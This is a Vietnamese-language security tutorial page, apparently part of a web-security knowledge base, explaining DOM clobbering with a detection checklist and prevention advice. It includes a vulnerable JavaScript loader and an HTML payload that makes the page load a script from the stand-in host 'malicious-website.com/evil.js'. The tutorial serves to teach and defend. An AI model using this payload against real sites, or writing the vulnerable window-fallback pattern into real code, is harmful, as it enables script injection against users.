# DOM Clobbering

## Định nghĩa

DOM clobbering là kỹ thuật dùng HTML tiêm vào để ghi đè tham chiếu hoặc thuộc tính JavaScript mà ứng dụng đang kỳ vọng, từ đó thay đổi hành vi thời gian chạy mà không cần script injection kiểu cổ điển.

Kỹ thuật này đặc biệt hữu ích khi XSS trực tiếp bị chặn nhưng attacker vẫn kiểm soát được HTML có thuộc tính `id`/`name`.

## Cơ chế cốt lõi

Trình duyệt có thể expose phần tử có tên như một thuộc tính global. Attacker tạo va chạm tên với đối tượng mà mã ứng dụng đang dùng.

Mẫu dễ lỗi điển hình:

```javascript
const someObject = window.someObject || {};
```

Nếu attacker kiểm soát HTML và tạo `id=someObject`, tham chiếu thời gian chạy có thể trỏ sang DOM node/DOM collection thay vì đối tượng dự kiến.

## Ví dụ khai thác

Hành vi script dễ lỗi:

```javascript
window.onload = function () {
  const someObject = window.someObject || {};
  const script = document.createElement("script");
  script.src = someObject.url;
  document.body.appendChild(script);
};
```

Mẫu payload clobbering:

```html
<a id=someObject></a>
<a id=someObject name=url href=//malicious-website.com/evil.js></a>
```

Ứng dụng đọc `someObject.url` từ DOM collection đã bị clobber và tải script URL do attacker chọn.

## Các mẫu clobbering thường gặp

| Pattern                                           | Mục đích                                   |
| ------------------------------------------------- | ------------------------------------------ |
| `x.y` và `x.y.value`                              | Ghi đè giả định về thuộc tính lồng nhau    |
| `x.y.z` và chuỗi sâu hơn                          | Lạm dụng tham chiếu nhiều tầng             |
| Va chạm `document.getElementById()` với root tags | Thay đổi ngữ nghĩa node mà mã đang kỳ vọng |
| Clobber thuộc tính form/input                     | Phá logic filter đang tin thuộc tính DOM   |

## Bypass filter qua clobber thuộc tính

Khi filter phía client lặp qua thuộc tính được coi là tin cậy (ví dụ `element.attributes`) mà không kiểm tra kiểu dữ liệu, DOM node bị clobber có thể làm lệch logic và khiến bước sanitize bị bỏ qua.

## Checklist phát hiện

1. Tìm các mẫu fallback global (`window.x || {}`).
2. Xác định đoạn script đọc thuộc tính đối tượng để dựng URL/script.
3. Kiểm tra attacker có khả năng tiêm HTML với `id` hoặc `name` không.
4. Thử va chạm theo các tên object/property mà logic bảo mật đang dùng.

## Phòng ngừa

1. Kiểm tra kiểu dữ liệu đối tượng/hàm trước khi dùng (ví dụ xác nhận đúng interface DOM mong đợi khi cần).
2. Tránh mẫu fallback global tin trực tiếp giá trị trong `window` namespace.
3. Dùng thư viện sanitize đã được kiểm chứng có xét đến DOM clobbering.
4. Thu hẹp tối đa bề mặt HTML injection, kể cả khi script tag trực tiếp đã bị lọc.

## Tệp liên quan

- [Nguyên nhân gốc rễ và API không an toàn](03-root-causes-and-insecure-apis.md)
- [DOM XSS](05-dom-xss.md)
- [Phòng thủ và giảm thiểu](14-defense-mitigation.md)
- [Ánh xạ nguồn tham chiếu](16-reference-mapping.md)
